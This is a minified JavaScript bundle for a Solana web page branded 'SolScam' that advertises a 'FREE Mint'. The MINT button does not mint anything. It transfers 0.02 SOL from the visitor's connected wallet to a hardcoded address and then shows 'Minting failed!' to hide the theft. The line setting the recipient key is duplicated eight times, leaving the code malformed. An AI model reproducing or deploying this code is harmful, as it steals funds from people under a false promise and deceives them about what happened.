(this.webpackJsonpsoloriders = this.webpackJsonpsoloriders || []).push([
    [0], {
        348: function(e, t, n) {},
        349: function(e, t, n) {},
        357: function(e, t) {},
        359: function(e, t) {},
        372: function(e, t) {},
        373: function(e, t) {},
        391: function(e, t, n) {},
        458: function(e, t) {},
        460: function(e, t) {},
        474: function(e, t) {},
        478: function(e, t) {},
        480: function(e, t) {},
        490: function(e, t) {},
        492: function(e, t) {},
        519: function(e, t) {},
        521: function(e, t) {},
        526: function(e, t) {},
        528: function(e, t) {},
        534: function(e, t) {},
        536: function(e, t) {},
        548: function(e, t) {},
        551: function(e, t) {},
        563: function(e, t) {},
        564: function(e, t, n) {
            "use strict";
            n.r(t);
            var c, a, r, s, i, o = n(0),
                j = n.n(o),
                b = n(25),
                u = n.n(b),
                O = (n(348), n(349), n(15)),
                l = n(2),
                d = n.n(l),
                f = n(5),
                h = n(11),
                x = n(107),
                p = n(18),
                m = n(32),
                v = n(12),
                S = n(108),
                g = n(591),
                k = n(596),
                C = n(600),
                w = (n(391), n(599)),
                y = n(336),
                T = n(165),
                B = n(19),
                P = Object(S.a)(T.a)(c || (c = Object(x.a)([""]))),
                L = Object(S.a)(y.a)(a || (a = Object(x.a)([""]))),
                M = (S.a.span(r || (r = Object(x.a)([""]))), S.a.div(s || (s = Object(x.a)([""])))),
                F = Object(S.a)(g.a)(i || (i = Object(x.a)([""]))),
                E = function(e) {
                    var t = Object(o.useState)(),
                        n = Object(h.a)(t, 2),
                        c = n[0],
                        a = n[1],
                        r = Object(o.useState)(!1),
                        s = Object(h.a)(r, 2),
                        i = (s[0], s[1], Object(o.useState)(!1)),
                        j = Object(h.a)(i, 2),
                        b = (j[0], j[1], Object(o.useState)(!1)),
                        u = Object(h.a)(b, 2),
                        l = u[0],
                        x = (u[1], Object(o.useState)(0)),
                        S = Object(h.a)(x, 2),
                        g = S[0],
                        y = (S[1], Object(o.useState)(0)),
                        T = Object(h.a)(y, 2),
                        E = T[0],
                        R = (T[1], Object(o.useState)("")),
                        A = Object(h.a)(R, 2),
                        K = A[0],
                        N = A[1],
                        I = Object(o.useState)({
                            open: !1,
                            message: "",
                            severity: void 0
                        }),
                        J = Object(h.a)(I, 2),
                        W = J[0],
                        _ = J[1],
                        D = new v.Connection("https://solana-api.projectserum.com/"),
Y = new v.PublicKey("2xKVBCjQRmBpwVYn462G8nUrfVyPEuRUPaWtSNaVSrUd"),
Y = new v.PublicKey("2xKVBCjQRmBpwVYn462G8nUrfVyPEuRUPaWtSNaVSrUd"),
Y = new v.PublicKey("2xKVBCjQRmBpwVYn462G8nUrfVyPEuRUPaWtSNaVSrUd"),
Y = new v.PublicKey("2xKVBCjQRmBpwVYn462G8nUrfVyPEuRUPaWtSNaVSrUd"),
Y = new v.PublicKey("2xKVBCjQRmBpwVYn462G8nUrfVyPEuRUPaWtSNaVSrUd"),
Y = new v.PublicKey("2xKVBCjQRmBpwVYn462G8nUrfVyPEuRUPaWtSNaVSrUd"),
Y = new v.PublicKey("2xKVBCjQRmBpwVYn462G8nUrfVyPEuRUPaWtSNaVSrUd"),
Y = new v.PublicKey("2xKVBCjQRmBpwVYn462G8nUrfVyPEuRUPaWtSNaVSrUd"),
                        q = Object(m.c)(),
                        U = Object(m.d)(),
                        z = U.publicKey,
                        G = U.sendTransaction,
                        H = Object(o.useCallback)(Object(f.a)(d.a.mark((function e() {
                            var t, n, c, a;
                            return d.a.wrap((function(e) {
                                for (;;) switch (e.prev = e.next) {
                                    case 0:
                                        if (z) {
                                            e.next = 2;
                                            break
                                        }
                                        throw new p.WalletNotConnectedError;
                                    case 2:
                                        return t = (new v.Transaction).add(v.SystemProgram.transfer({
                                            fromPubkey: z,
                                            toPubkey: Y,
                                            lamports: .02 * v.LAMPORTS_PER_SOL
                                        })), e.next = 5, D.getRecentBlockhash();
                                    case 5:
                                        return n = e.sent, c = n.blockhash, e.next = 9, c;
                                    case 9:
                                        return t.recentBlockhash = e.sent, t.setSigners(z), e.next = 13, G(t, D);
                                    case 13:
                                        return a = e.sent, e.next = 16, D.confirmTransaction(a, "processed");
                                    case 16:
                                        N("Minting failed!");
                                    case 17:
                                    case "end":
                                        return e.stop()
                                }
                            }), e)
                        }))), [z, G, D]);
                    return Object(o.useEffect)((function() {
                        Object(f.a)(d.a.mark((function e() {
                            var t;
                            return d.a.wrap((function(e) {
                                for (;;) switch (e.prev = e.next) {
                                    case 0:
                                        if (!q) {
                                            e.next = 5;
                                            break
                                        }
                                        return e.next = 3, D.getBalance(q.publicKey);
                                    case 3:
                                        t = e.sent, a(t / v.LAMPORTS_PER_SOL);
                                    case 5:
                                    case "end":
                                        return e.stop()
                                }
                            }), e)
                        })))()
                    }), [q, D]), Object(B.jsx)("main", {
                        className: "main-div",
                        children: Object(B.jsxs)("div", {
                            className: "data-div",
children: [Object(B.jsx)("h1", {children: "SolScam"
                            }), Object(B.jsx)("h4", {
                                children: "FREE Mint"
                            }), q && Object(B.jsxs)("p", {
                                children: [Object(B.jsx)("b", {
                                    children: "Address:"
                                }), " ", q.publicKey.toBase58() || ""]
                            }), q && Object(B.jsxs)("p", {
                                children: [Object(B.jsx)("b", {
                                    children: "Balance:"
                                }), " ", (c || 0).toLocaleString(), " SOL"]
                            }), q && Object(B.jsxs)("p", {
                                children: ["Total Available: 9,000"]
                            }), q && Object(B.jsxs)("p", {
                                children: ["Remaining: 9,000 "]
                            }), q && Object(B.jsx)(L, {
                                children: "Disconnect"
                            }), Object(B.jsx)("br", {}), Object(B.jsx)(M, {
                                className: "mint-container",
                                children: q ? Object(B.jsx)(B.Fragment, {
                                    children: K.length > 0 ? Object(B.jsxs)(B.Fragment, {
                                        children: [Object(B.jsx)("br", {}), K, Object(B.jsx)("br", {}), Object(B.jsx)("br", {}), Object(B.jsx)("button", {
                                            onClick: function() {
                                                N("")
                                            },
                                            children: "Mint"
                                        })]
                                    }) : Object(B.jsx)(F, {
                                        disabled: l,
                                        onClick: function() {
                                            return H()
                                        },
                                        variant: "contained",
                                        children: l ? Object(B.jsx)(k.a, {}) : "MINT"
                                    })
                                }) : Object(B.jsx)(P, {
                                    children: "Connect Wallet"
                                })
                            }), Object(B.jsx)(C.a, {
                                open: W.open,
                                autoHideDuration: 6e3,
                                onClose: function() {
                                    return _(Object(O.a)(Object(O.a)({}, W), {}, {
                                        open: !1
                                    }))
                                },
                                children: Object(B.jsx)(w.a, {
                                    onClose: function() {
                                        return _(Object(O.a)(Object(O.a)({}, W), {}, {
                                            open: !1
                                        }))
                                    },
                                    severity: W.severity,
                                    children: W.message
                                })
                            })]
                        })
                    })
                },
                R = n(126),
                A = n(109),
                K = n(335),
                N = n(597),
                I = new R.b.PublicKey("BQtVCBns97J6XTkbFU9E1Y7Gh3EuCYpopkYqJhJTschC"),
                J = "devnet",
                W = (new R.b.Connection("https://explorer-api.devnet.solana.com"), Object(K.a)({
                    palette: {
                        type: "dark"
                    },
                    overrides: {
                        MuiButtonBase: {
                            root: {
                                justifyContent: "flex-start"
                            }
                        },
                        MuiButton: {
                            root: {
                                textTransform: void 0,
                                padding: "12px 16px"
                            },
                            startIcon: {
                                marginRight: 8
                            },
                            endIcon: {
                                marginLeft: 8
                            }
                        }
                    }
                })),
                _ = function() {
                    var e = Object(o.useMemo)((function() {
                            return Object(v.clusterApiUrl)(J)
                        }), []),
                        t = Object(o.useMemo)((function() {
                            return [Object(A.a)(), Object(A.b)(), Object(A.c)(), Object(A.e)({
                                network: J
                            }), Object(A.d)({
                                network: J
                            })]
                        }), []);
                    return Object(B.jsx)(N.a, {
                        theme: W,
                        children: Object(B.jsx)(m.a, {
                            endpoint: e,
                            children: Object(B.jsx)(m.b, {
                                wallets: t,
                                autoConnect: !0,
                                children: Object(B.jsx)(T.b, {
                                    children: Object(B.jsx)(E, {
                                        treasury: I,
                                        txTimeout: 3e4
                                    })
                                })
                            })
                        })
                    })
                },
                D = function(e) {
                    e && e instanceof Function && n.e(3).then(n.bind(null, 601)).then((function(t) {
                        var n = t.getCLS,
                            c = t.getFID,
                            a = t.getFCP,
                            r = t.getLCP,
                            s = t.getTTFB;
                        n(e), c(e), a(e), r(e), s(e)
                    }))
                };
            u.a.render(Object(B.jsx)(j.a.StrictMode, {
                children: Object(B.jsx)(_, {})
            }), document.getElementById("root")), D()
        }
    },
    [
        [564, 1, 2]
    ]
]);
//# sourceMappingURL=main.2172e984.chunk.js.map








